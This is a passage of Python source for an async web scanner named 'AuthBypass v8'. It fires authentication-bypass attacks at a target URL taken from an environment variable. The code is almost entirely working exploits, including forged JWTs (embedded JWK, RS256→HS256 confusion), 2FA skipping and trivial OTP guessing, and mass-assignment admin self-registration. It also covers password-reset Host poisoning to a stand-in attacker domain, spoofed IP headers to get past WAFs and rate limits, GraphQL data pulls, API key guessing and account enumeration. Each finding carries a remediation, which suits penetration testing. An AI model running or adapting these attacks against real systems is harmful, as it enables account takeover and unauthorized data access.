                    proof=f"JWT with embedded JWK (attacker-controlled key)\n  GET {path}\n  HTTP {s} — PROTECTED RESOURCE RETURNED\n  JWK: {json.dumps(jwk)}\n  Body: {body[:300]}",
                    detail="Server accepts JWT with embedded JWK header — attacker controls the verification key.",
                    url=self.target + path,
                    remediation="Never trust the 'jwk' header parameter. Use a server-side key registry. Validate signing key against pre-configured trusted keys only.",
                    exploitability=10,
                    impact="Full authentication bypass — attacker provides their own signing key in the JWT header.",
                    reproducibility=f"# Generate JWT with jwk header containing attacker key\ncurl -s {self.target}{path} -H 'Authorization: Bearer {token[:60]}...'",
                    mitigation_layers=["Server-side key registry", "JWK header rejection", "Key pinning"],
                    proof_type="AUTH_BYPASS",
                    extra={"jwk": jwk},
                )
                return

    # ── Test 7: JWT algorithm confusion RS256→HS256 ───────────────────────────

    async def test_jwt_algorithm_confusion(self, sess):
        print("\n[*] Testing JWT RS256→HS256 algorithm confusion...")
        # Try to get server's public key from common JWKS endpoints
        jwks_paths = [
            "/.well-known/jwks.json", "/api/auth/jwks", "/api/jwks",
            "/.well-known/openid-configuration", "/oauth/jwks",
            "/api/v1/auth/jwks", "/.well-known/keys",
        ]
        pub_key_material: bytes | None = None
        for jpath in jwks_paths:
            s, body, _ = await self._get(sess, jpath)
            await delay()
            if s == 200 and body and "keys" in body:
                # Use the body as the HMAC key (RS256→HS256 confusion)
                pub_key_material = body.encode()
                break

        if not pub_key_material:
            # Fallback: use empty/trivial key
            pub_key_material = b"publickey"

        admin_payload = self._build_jwt_payload("admin")
        token = _forge_jwt(admin_payload, "HS256", pub_key_material)
        for path in PROTECTED_PATHS[:5]:
            s, body, _ = await self._get(sess, path,
                headers={"Authorization": f"Bearer {token}"})
            await delay()
            if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                self._finding(
                    ftype="JWT_ALGORITHM_CONFUSION_RS256_HS256",
                    severity="CRITICAL", conf=93,
                    proof=f"RS256→HS256 algorithm confusion\n  Used public key as HMAC secret\n  GET {path}\n  HTTP {s} — PROTECTED RESOURCE RETURNED\n  Body: {body[:300]}",
                    detail="Server vulnerable to RS256→HS256 algorithm confusion. Accepts HS256 JWT signed with public key as secret.",
                    url=self.target + path,
                    remediation="Reject alg header from JWT. Hardcode expected algorithm server-side. Use asymmetric key pinning.",
                    exploitability=10,
                    impact="Full authentication bypass — attacker forges JWT using the server's own public key.",
                    reproducibility=f"# Sign with RS256 public key as HS256 secret\ncurl -s {self.target}{path} -H 'Authorization: Bearer {token[:60]}...'",
                    mitigation_layers=["Algorithm hardcoding", "alg header rejection", "Key type enforcement"],
                    proof_type="AUTH_BYPASS",
                    extra={"pub_key_source": "jwks endpoint"},
                )
                return

    # ── Test 8: 2FA/OTP bypass ────────────────────────────────────────────────

    async def test_2fa_bypass(self, sess):
        print("\n[*] Testing 2FA/MFA bypass...")
        for path in VERIFY_PATHS:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None or s0 == 404:
                continue

            # Attempt 1: Skip step entirely — direct API call without MFA token
            for protected in PROTECTED_PATHS[:4]:
                s, body, _ = await self._get(sess, protected)
                await delay()
                if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                    self._finding(
                        ftype="MFA_STEP_SKIPPABLE",
                        severity="HIGH", conf=85,
                        proof=f"MFA endpoint found at {path}\n  Direct call to {protected} without completing MFA\n  HTTP {s} — DATA RETURNED\n  Body: {body[:200]}",
                        detail=f"MFA verification step at {path} is skippable. Protected resource {protected} accessible without completing 2FA.",
                        url=self.target + protected,
                        remediation="Enforce MFA completion server-side via session state. Never rely on client-side flags. Token-gate post-MFA resources.",
                        exploitability=8,
                        impact="Authentication 2FA bypass — partial-auth session grants full resource access.",
                        reproducibility=f"curl -s {self.target}{protected}  # Without completing MFA",
                        mitigation_layers=["Server-side MFA state", "Token-gated endpoints"],
                        proof_type="AUTH_BYPASS",
                    )
                    break

            # Attempt 2: OTP null/empty bypass
            for otp_val in ["", "null", "undefined", "000000", "123456", "999999", "111111"]:
                s, body, _ = await self._post(sess, path,
                    json_data={"otp": otp_val, "code": otp_val, "token": otp_val,
                               "mfa_code": otp_val, "totp": otp_val})
                await delay(0.2)
                if is_real_200(s) and self._has_auth_success(body):
                    self._finding(
                        ftype="MFA_OTP_TRIVIAL_BYPASS",
                        severity="CRITICAL", conf=93,
                        proof=f"POST {path}\n  otp/code={otp_val!r}\n  HTTP {s} — MFA BYPASSED\n  Body: {body[:200]}",
                        detail=f"MFA bypassed with trivial OTP value '{otp_val}' at {path}.",
                        url=self.target + path,
                        remediation="Validate OTP server-side with TOTP library. Reject empty/null codes. Rate-limit OTP attempts. Expire codes after 30s.",
                        exploitability=9,
                        impact="2FA completely bypassed — attacker with stolen password gains full access.",
                        reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{{\"otp\":\"{otp_val}\"}}'",
                        mitigation_layers=["TOTP validation", "Code expiry", "Rate limiting", "Lockout after 3 attempts"],
                        proof_type="AUTH_BYPASS",
                        extra={"otp_value": otp_val},
                    )
                    return

    # ── Test 9: Mass assignment privilege escalation ───────────────────────────

    async def test_mass_assignment(self, sess):
        print("\n[*] Testing mass assignment privilege escalation...")
        rand       = "".join(random.choices(string.ascii_lowercase, k=8))
        test_email = f"mirror_test_{rand}@protonmail.com"
        test_user  = f"mirror_test_{rand}"
        test_pass  = f"MirrorTest@{rand}!9"
        for path in REGISTER_PATHS:
            for esc_payload in ESCALATION_FIELDS:
                reg_payload = {
                    "username": test_user, "email": test_email,
                    "password": test_pass, "name": test_user,
                    **esc_payload,
                }
                s, body, _ = await self._post(sess, path, json_data=reg_payload)
                await delay()
                if s is None or s in (404, 405):
                    break
                if not is_real_200(s) or len(body) < 20:
                    continue
                esc_key = list(esc_payload.keys())[0]
                esc_val = list(esc_payload.values())[0]
                body_l  = body.lower()
                accepted = (
                    str(esc_key).lower() in body_l or
                    str(esc_val).lower() in body_l or
                    self._has_admin(body)
                )
                if not accepted:
                    continue
                token = self._extract_token(body)
                verified_role = self._extract_json_field(body, "role")
                self._finding(
                    ftype="MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                    severity="CRITICAL", conf=92,
                    proof=f"POST {path}\n  Payload: {json.dumps(reg_payload)[:300]}\n  HTTP {s}\n  Server accepted '{esc_key}' = {esc_val}\n  Role: {verified_role or 'admin-indicator'}\n  Body: {body[:300]}",
                    detail=f"Registration at {path} accepts '{esc_key}' and reflects it. Self-registration as admin.",
                    url=self.target + path,
                    remediation="Use explicit field allowlist. Never bind all request fields. Server-side role assignment only. DTO validation.",
                    exploitability=9,
                    impact="Self-register as admin — full admin access with no prior authentication.",
                    reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{json.dumps(reg_payload)}'",
                    mitigation_layers=["Field allowlisting", "Server-side role assignment", "Input schema validation"],
                    proof_type="ACCOUNT_TAKEOVER",
                    extra={"escalation_field": esc_key, "escalation_value": str(esc_val)},
                )
                return

    # ── Test 10: Password reset host header poisoning ─────────────────────────

    async def test_password_reset_poisoning(self, sess):
        print("\n[*] Testing password reset host header poisoning...")
        poison_host = "attacker.mirror-scanner.evil"
        for path in RESET_PATHS:
            for email_field in ["email", "username", "user_email"]:
                payload = {email_field: "admin@example.com"}
                poison_hdrs = {
                    "Host": poison_host, "X-Forwarded-Host": poison_host,
                    "X-Host": poison_host, "User-Agent": random_ua(),
                }
                s, body, _ = await self._post(sess, path, json_data=payload, headers=poison_hdrs)
                await delay()
                if s is None or s in (404, 405):
                    break
                if is_real_200(s) and body:
                    reflected = poison_host in body
                    reset_triggered = any(k in body.lower() for k in ["reset", "email", "sent", "link", "token", "check"])
                    if reflected or reset_triggered:
                        conf = 95 if reflected else 72
                        self._finding(
                            ftype="PASSWORD_RESET_HOST_HEADER_POISONING",
                            severity="HIGH", conf=conf,
                            proof=f"POST {path}\n  Host: {poison_host}\n  X-Forwarded-Host: {poison_host}\n  body: {{{email_field}: admin@example.com}}\n  HTTP {s}\n  Reflected: {'YES' if reflected else 'NO (reset triggered)'}\n  Body: {body[:300]}",
                            detail=f"Password reset triggered with poisoned Host header '{poison_host}'. {'Attacker domain reflected.' if reflected else 'Reset link may use Host header.'}",
                            url=self.target + path,
                            remediation="Hardcode APP_URL for reset links. Validate Host header. Never use Host header in email templates.",
                            exploitability=7,
                            impact="Account takeover — user clicks reset link going to attacker domain. Attacker captures reset token.",
                            reproducibility=f"curl -s -X POST {self.target}{path} -H 'Host: {poison_host}' -H 'X-Forwarded-Host: {poison_host}' -H 'Content-Type: application/json' -d '{{\"{email_field}\":\"admin@example.com\"}}'",
                            mitigation_layers=["Hardcoded APP_URL", "Host header whitelist", "HSTS"],
                            proof_type="ACCOUNT_TAKEOVER",
                            extra={"poison_host_reflected": reflected},
                        )
                        return

    # ── Test 11: HTTP verb tampering ──────────────────────────────────────────

    async def test_http_verb_tampering(self, sess):
        print("\n[*] Testing HTTP verb tampering past auth middleware...")
        for path in PROTECTED_PATHS:
            s_get, body_get, _ = await self._get(sess, path)
            await delay()
            if s_get in (404, None):
                continue
            if s_get == 200 and self._has_data(body_get):
                continue
            for method in ["HEAD", "OPTIONS", "TRACE", "PATCH", "PUT", "DELETE",
                           "CONNECT", "PROPFIND", "SEARCH", "LOCK", "UNLOCK"]:
                s, body, hdrs = await self._request(sess, method, self.target + path)
                await delay(0.1)
                if s is None:
                    continue
                if s == 200 and self._has_data(body):
                    self._finding(
                        ftype="HTTP_VERB_TAMPERING_AUTH_BYPASS",
                        severity="HIGH", conf=89,
                        proof=f"Baseline GET {path} → HTTP {s_get} (blocked)\n{method} {path} → HTTP {s}\n  Auth bypassed!\n  Body: {body[:300]}",
                        detail=f"HTTP verb tampering bypasses auth at {path}. {method} returns 200 with data while GET is blocked.",
                        url=self.target + path,
                        remediation="Apply authorization checks independent of HTTP method. Return 405 for non-permitted methods.",
                        exploitability=7,
                        impact=f"Auth bypass — protected {path} accessible via {method} without authentication.",
                        reproducibility=f"curl -s -X {method} {self.target}{path}",
                        mitigation_layers=["Method-agnostic auth", "Allowed methods allowlist"],
                        proof_type="AUTH_BYPASS",
                        extra={"bypass_method": method, "baseline_status": s_get},
                    )
                    return

    # ── Test 12: Path normalization bypass ────────────────────────────────────

    async def test_path_normalization_bypass(self, sess):
        print("\n[*] Testing path normalization bypass...")
        s_normal, body_normal, _ = await self._get(sess, "/admin")
        await delay()
        if s_normal == 200 and self._has_data(body_normal):
            return
        for bypass_path, technique in BYPASS_PATHS:
            s, body, _ = await self._get(sess, bypass_path)
            await delay(0.08)
            if s is None or s == 404:
                continue
            if s == 200 and (self._has_data(body) or self._has_admin(body) or len(body) > 200):
                self._finding(
                    ftype="PATH_NORMALIZATION_AUTH_BYPASS",
                    severity="HIGH", conf=87,
                    proof=f"Normal /admin → HTTP {s_normal} (blocked)\n{bypass_path} → HTTP {s} — BYPASS ({technique})\n  Body: {body[:300]}",
                    detail=f"Path normalization bypass '{bypass_path}' ({technique}) bypasses auth at /admin.",
                    url=self.target + bypass_path,
                    remediation="Normalize paths before authorization. Use framework-level route guard. Test all bypass variants.",
                    exploitability=7,
                    impact=f"Admin panel bypass — protected resources accessible via '{bypass_path}'.",
                    reproducibility=f"curl -s {self.target}{bypass_path}",
                    mitigation_layers=["Pre-auth path normalization", "Framework route guards"],
                    proof_type="AUTH_BYPASS",
                    extra={"bypass_path": bypass_path, "technique": technique},
                )
                return

    # ── Test 13: WAF / IP restriction bypass ──────────────────────────────────

    async def test_waf_bypass_headers(self, sess):
        print("\n[*] Testing WAF/IP restriction bypass with forged headers...")
        for path in PROTECTED_PATHS + ["/api/admin", "/api/admin/users"]:
            s_baseline, _, _ = await self._get(sess, path)
            await delay()
            if s_baseline in (404, None) or s_baseline == 200:
                continue
            bypass_header_sets = [
                WAF_BYPASS_HEADERS,
                {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
                {"X-Forwarded-For": "::1"},
                {"X-Custom-IP-Authorization": "127.0.0.1"},
                {"X-Forwarded-For": "10.0.0.1", "X-Real-IP": "10.0.0.1"},
                {"CF-Connecting-IP": "127.0.0.1"},
                {"True-Client-IP": "127.0.0.1"},
                {"X-Forwarded-For": "localhost"},
            ]
            for hset in bypass_header_sets:
                s, body, _ = await self._get(sess, path, headers={**hset, "User-Agent": random_ua()})
                await delay()
                if s == 200 and (self._has_data(body) or self._has_admin(body)):
                    self._finding(
                        ftype="WAF_IP_RESTRICTION_BYPASS",
                        severity="HIGH", conf=87,
                        proof=f"Baseline GET {path} → HTTP {s_baseline}\nGET {path} with bypass headers → HTTP {s}\n  Bypass headers: {json.dumps(hset)}\n  Body: {body[:300]}",
                        detail=f"IP restriction bypassed via forged headers at {path}. Server trusts client-supplied IP headers.",
                        url=self.target + path,
                        remediation="Never trust X-Forwarded-For for access control. Use raw socket IP (REMOTE_ADDR). Use network-level controls (VPN, firewall).",
                        exploitability=7,
                        impact=f"Admin endpoints accessible by anyone — attacker spoofs IP via header.",
                        reproducibility=f"curl -s {self.target}{path} -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'",
                        mitigation_layers=["REMOTE_ADDR only", "Firewall-level IP control", "VPN for admin"],
                        proof_type="AUTH_BYPASS",
                        extra={"bypass_headers": list(hset.keys())},
                    )
                    return

    # ── Test 14: GraphQL auth bypass ─────────────────────────────────────────

    async def test_graphql_auth_bypass(self, sess):
        print("\n[*] Testing GraphQL auth bypass...")
        gql_endpoints = ["/graphql", "/api/graphql", "/api/v1/graphql", "/query"]
        sensitive_queries = [
            {"query": "{ users { id email role password } }"},
            {"query": "{ user(id: 1) { id email role token } }"},
            {"query": "{ me { id email role is_admin } }"},
            {"query": "{ allUsers { nodes { id email role } } }"},
            {"query": "{ admin { users { id email } } }"},
            {"query": "mutation { login(username:\"admin\", password:\"admin\") { token } }"},
            {"query": "{ __schema { types { name fields { name } } } }"},
        ]
        for ep in gql_endpoints:
            s0, _, _ = await self._get(sess, ep)
            await delay()
            if s0 in (None, 404):
                continue
            for query_body in sensitive_queries:
                s, body, _ = await self._post(sess, ep, json_data=query_body)
                await delay(0.1)
                if s != 200 or not body:
                    continue
                if "errors" in body and '"message"' in body:
                    continue
                if self._has_data(body) or self._has_auth_success(body) or '"email"' in body:
                    self._finding(
                        ftype="GRAPHQL_UNAUTH_DATA_ACCESS",
                        severity="HIGH", conf=88,
                        proof=f"POST {ep}\n  Query: {query_body['query'][:100]}\n  HTTP {s} — DATA RETURNED\n  Body: {body[:300]}",
                        detail=f"GraphQL endpoint {ep} returns sensitive data without authentication.",
                        url=self.target + ep,
                        remediation="Apply authorization middleware to all GraphQL resolvers. Disable introspection in production. Use field-level auth.",
                        exploitability=8,
                        impact="Unauthenticated access to user data, credentials, or admin functionality via GraphQL.",
                        reproducibility=f"curl -s -X POST {self.target}{ep} -H 'Content-Type: application/json' -d '{json.dumps(query_body)}'",
                        mitigation_layers=["GraphQL auth middleware", "Field-level auth", "Introspection disabled"],
                        proof_type="UNAUTHORIZED_ACCESS",
                        extra={"query": query_body["query"][:100]},
                    )
                    return

    # ── Test 15: API key brute-force via headers ───────────────────────────────

    async def test_api_key_bypass(self, sess):
        print("\n[*] Testing API key header brute-force...")
        api_key_headers = [
            "X-API-Key", "X-Api-Key", "api-key", "apikey", "API-Key",
            "X-Access-Token", "X-Token", "X-Auth", "X-API-Token",
            "X-Master-Key", "X-Secret-Key",
        ]
        trivial_keys = [
            "admin", "secret", "test", "key", "apikey", "123456",
            "password", "default", "changeme", "master", "internal",
            "development", "dev", "prod", "production", "staging",
            "token", "auth", "bearer", "api", "service",
        ]
        for path in PROTECTED_PATHS[:5]:
            s_base, body_base, _ = await self._get(sess, path)
            await delay()
            if s_base in (None, 404) or s_base == 200:
                continue
            for header_name in api_key_headers:
                for key_val in trivial_keys:
                    s, body, _ = await self._get(sess, path,
                        headers={header_name: key_val})
                    await delay(0.08)
                    if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                        self._finding(
                            ftype="API_KEY_TRIVIAL_BYPASS",
                            severity="CRITICAL", conf=93,
                            proof=f"Baseline GET {path} → HTTP {s_base}\nGET {path} with {header_name}: {key_val!r} → HTTP {s}\n  PROTECTED RESOURCE RETURNED\n  Body: {body[:300]}",
                            detail=f"Trivial API key '{key_val}' accepted in header '{header_name}' for protected endpoint {path}.",
                            url=self.target + path,
                            remediation="Use cryptographically random API keys ≥256 bits. Rotate keys. Store hashed. Rate-limit key attempts.",
                            exploitability=9,
                            impact="Full API access with trivial/default API key — no authentication needed.",
                            reproducibility=f"curl -s {self.target}{path} -H '{header_name}: {key_val}'",
                            mitigation_layers=["Strong random API keys", "Key rotation", "Rate limiting"],
                            proof_type="AUTH_BYPASS",
                            extra={"header": header_name, "key": key_val},
                        )
                        return

    # ── Test 16: API version downgrade ────────────────────────────────────────

    async def test_api_version_downgrade(self, sess):
        print("\n[*] Testing API version downgrade to unauth endpoints...")
        version_pairs = [
            ("/api/v2/users", "/api/v1/users"),
            ("/api/v2/me",    "/api/v1/me"),
            ("/api/v3/users", "/api/v2/users"),
            ("/api/v3/me",    "/api/v1/me"),
            ("/api/v2/admin", "/api/v1/admin"),
            ("/api/v2/profile","/api/profile"),
            ("/api/v3/profile","/api/v1/profile"),
        ]
        for current, older in version_pairs:
            s_current, _, _ = await self._get(sess, current)
            await delay()
            if s_current not in (401, 403):
                continue
            s_old, body_old, _ = await self._get(sess, older)
            await delay()
            if s_old == 200 and (self._has_data(body_old) or self._has_auth_success(body_old)):
                self._finding(
                    ftype="API_VERSION_DOWNGRADE_BYPASS",
                    severity="HIGH", conf=88,
                    proof=f"Current endpoint {current} → HTTP {s_current} (auth enforced)\nOlder {older} → HTTP {s_old} — DATA RETURNED (no auth)\n  Body: {body_old[:300]}",
                    detail=f"API version downgrade: older API version {older} lacks authentication enforced in {current}.",
                    url=self.target + older,
                    remediation="Apply consistent authentication across all API versions. Deprecate and remove old API versions. Add auth middleware at API gateway level.",
                    exploitability=7,
                    impact="Unauthenticated access to protected data via older API version.",
                    reproducibility=f"curl -s {self.target}{older}",
                    mitigation_layers=["Consistent auth across versions", "API gateway enforcement", "Deprecation policy"],
                    proof_type="UNAUTHORIZED_ACCESS",
                    extra={"current_version": current, "vulnerable_version": older},
                )
                return

    # ── Test 17: Account enumeration ─────────────────────────────────────────

    async def test_account_enumeration(self, sess):
        print("\n[*] Testing account enumeration via response differences...")
        for path in LOGIN_PATHS[:5]:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None or s0 == 404:
                continue
            known_bad  = "nonexistent_user_xyz_mirror_99999@notreal.invalid"
            likely_real = "admin@example.com"
            _, body_bad,  _ = await self._post(sess, path,
                json_data={"email": known_bad,  "password": "wrongpass123"})
            await delay(0.3)
            _, body_real, _ = await self._post(sess, path,
                json_data={"email": likely_real, "password": "wrongpass123"})
            await delay(0.3)
            body_bad  = body_bad  or ""
            body_real = body_real or ""
            if not body_bad or not body_real:
                continue
            # Check for different error messages
            diff_messages = any([
                ("not found" in body_bad.lower() or "no account" in body_bad.lower()) and "incorrect password" in body_real.lower(),
                ("user" in body_bad.lower() and "user" not in body_real.lower()),
                (len(body_real) > len(body_bad) * 1.5),
                ("email" in body_bad.lower() and "password" in body_real.lower()),
            ])
            if diff_messages:
                self._finding(
                    ftype="ACCOUNT_ENUMERATION_VIA_RESPONSE",
                    severity="MEDIUM", conf=80,
                    proof=f"POST {path}\n  email={known_bad!r} → response: {body_bad[:100]!r}\n  email={likely_real!r} → response: {body_real[:100]!r}\n  Different error messages reveal account existence",
                    detail=f"Login at {path} returns different error messages for existing vs non-existing accounts.",
                    url=self.target + path,
                    remediation="Return identical error message for wrong username and wrong password: 'Invalid credentials'. Add timing normalization.",
                    exploitability=5,
                    impact="Account enumeration — attacker maps valid email addresses for targeted credential stuffing.",
                    reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{{\"email\":\"admin@example.com\",\"password\":\"wrong\"}}'",
                    mitigation_layers=["Generic error messages", "Timing normalization", "Rate limiting"],
                    proof_type="RECONNAISSANCE",
                    extra={"path": path},
                )
                return

    # ── Test 18: Rate limit bypass on login ───────────────────────────────────

    async def test_rate_limit_bypass(self, sess):
        print("\n[*] Testing rate limit bypass on login endpoints...")
        bypass_header_sets = [
            {"X-Forwarded-For": "10.0.0.{}".format(random.randint(1, 254))},
            {"X-Forwarded-For": "192.168.0.{}".format(random.randint(1, 254))},
            {"CF-Connecting-IP": "10.0.0.{}".format(random.randint(1, 254))},
            {"True-Client-IP": "172.16.0.{}".format(random.randint(1, 254))},
            {"X-Real-IP": "10.1.1.{}".format(random.randint(1, 254))},
        ]
        for path in LOGIN_PATHS[:4]:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None or s0 == 404:
                continue
            # Send 15 rapid login attempts
            rate_limited = False
            for i in range(15):
                h = bypass_header_sets[i % len(bypass_header_sets)]
                s, _, _ = await self._post(sess, path,
                    json_data={"email": "ratelimitcheck@example.com", "password": f"wrong{i}"},
                    headers=h)
                await asyncio.sleep(0.05)  # very fast
                if s == 429:
                    rate_limited = True
                    break

            if not rate_limited:
                self._finding(
                    ftype="RATE_LIMIT_ABSENT_ON_LOGIN",
                    severity="MEDIUM", conf=82,
                    proof=f"POST {path}\n  15 rapid login attempts with rotating X-Forwarded-For headers\n  No 429 Too Many Requests received\n  Rate limiting absent or bypassable via IP header spoofing",
                    detail=f"Login endpoint {path} has no effective rate limiting. Credential stuffing/brute force possible.",
                    url=self.target + path,
                    remediation="Implement rate limiting at application and infrastructure level. Require CAPTCHA after 5 failed attempts. Implement account lockout. Do not trust X-Forwarded-For for rate limiting.",
                    exploitability=6,
                    impact="Credential stuffing and brute force attacks unimpeded.",
                    reproducibility=f"# 15 rapid POST to {path} with rotating X-Forwarded-For headers",
                    mitigation_layers=["Rate limiting", "CAPTCHA", "Account lockout", "IP-agnostic rate limiting"],
                    proof_type="RECONNAISSANCE",
                )
                return

    # ── Test 19: Path normalization bypass using smart_filter variants ────────

    async def test_smart_path_bypass_variants(self, sess):
        """Use PATH_BYPASS_VARIANTS from smart_filter to attempt 34+ path variants
        against every protected endpoint, rotating the source IP on every request.
        Only reports a finding when the bypass variant returns 200/201 while the
        canonical path returns 401/403/404 (true-positive gated)."""
        print("\n[*] Testing smart path normalization bypass (34+ variants)...")
        probe_paths = PROTECTED_PATHS[:8]  # top 8 to limit noise
        for base_path in probe_paths:
            canonical = self.target + base_path
            s_canonical, body_canonical, _ = await self._get(sess, canonical)
            await delay(0.1)
            # Skip if canonical returns 200 (nothing to bypass) or outright 404 (not found)
            if s_canonical is None or s_canonical in (200, 201, 404):
                continue
            blocked_status = s_canonical  # typically 401 or 403
            for variant_path, _bypass_label in PATH_BYPASS_VARIANTS(base_path):
                if variant_path == base_path:
                    continue
                hdrs = make_bypass_headers(extra={"User-Agent": random_ua()})
                url = self.target + variant_path
                s, body, _ = await self._get(sess, url, headers=hdrs)
                await delay(0.05)
                if not is_real_200(s):
                    continue
                # Confirm body has meaningful data (not just a redirect to login page)
                body_l = (body or "").lower()
                if not any(kw in body_l for kw in ["id", "email", "user", "token", "admin", "role", "name"]):
                    continue
                self._finding(
                    ftype="PATH_BYPASS_AUTH",
                    severity="HIGH", conf=88,
                    proof=(
                        f"Canonical: GET {canonical} → HTTP {blocked_status}\n"
                        f"Bypass:    GET {url} → HTTP {s}\n"
                        f"Body snippet: {body[:200]!r}"
                    ),
                    detail=(
                        f"Path normalization bypass: canonical path {base_path!r} returns {blocked_status} "
                        f"but variant {variant_path!r} returns {s}, exposing protected resource."
                    ),
                    url=url,
                    remediation=(
                        "1. Normalize all incoming paths before applying authorization checks.\n"
                        "2. Reject paths containing ../, double-slashes, null bytes, encoded slashes.\n"
                        "3. Apply access control in middleware before any routing occurs.\n"
                        "4. Use allowlist-based path matching in your security layer."
                    ),
                    exploitability=8,
                    impact="Authentication bypass — protected endpoint accessible without valid credentials.",
                    reproducibility=f"curl -s '{url}' -H 'X-Forwarded-For: 127.0.0.1'",
                    mitigation_layers=["Path normalization", "AuthZ middleware ordering", "WAF rules"],
                    proof_type="EXPLOITATION",
                    extra={"bypass_variant": variant_path, "canonical": base_path},
                )
                break  # one confirmed bypass per base_path is enough

    # ── Main ─────────────────────────────────────────────────────────────────

    async def run(self):
        print(f"\n{'='*60}\n  AuthBypass v8 — Proof-of-Exploitation Auth Bypass\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=20, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY * 2)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            tests = [
                self.test_sqli_login_bypass(sess),
                self.test_default_credentials(sess),
                self.test_jwt_none_algorithm(sess),
                self.test_jwt_weak_secret(sess),
                self.test_jwt_kid_injection(sess),
                self.test_jwt_jwk_injection(sess),
                self.test_jwt_algorithm_confusion(sess),
                self.test_2fa_bypass(sess),
                self.test_mass_assignment(sess),
                self.test_password_reset_poisoning(sess),
                self.test_http_verb_tampering(sess),
                self.test_path_normalization_bypass(sess),
                self.test_waf_bypass_headers(sess),
                self.test_graphql_auth_bypass(sess),
                self.test_api_key_bypass(sess),
                self.test_api_version_downgrade(sess),
                self.test_account_enumeration(sess),
                self.test_rate_limit_bypass(sess),
                self.test_smart_path_bypass_variants(sess),
            ]
            # Run in concurrent batches (some tests depend on shared state)
            await asyncio.gather(*tests, return_exceptions=True)

        print(f"\n[+] AuthBypass v8 complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    if not target.startswith("http"):
        target = "https://" + target
    scanner = AuthBypass(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "authbypass.json"
    out.parent.mkdir(exist_ok=True)
    out.write_text(json.dumps(findings, indent=2, default=str))
    print(f"[+] Saved {len(findings)} findings → {out}")


if __name__ == "__main__":
    asyncio.run(main())
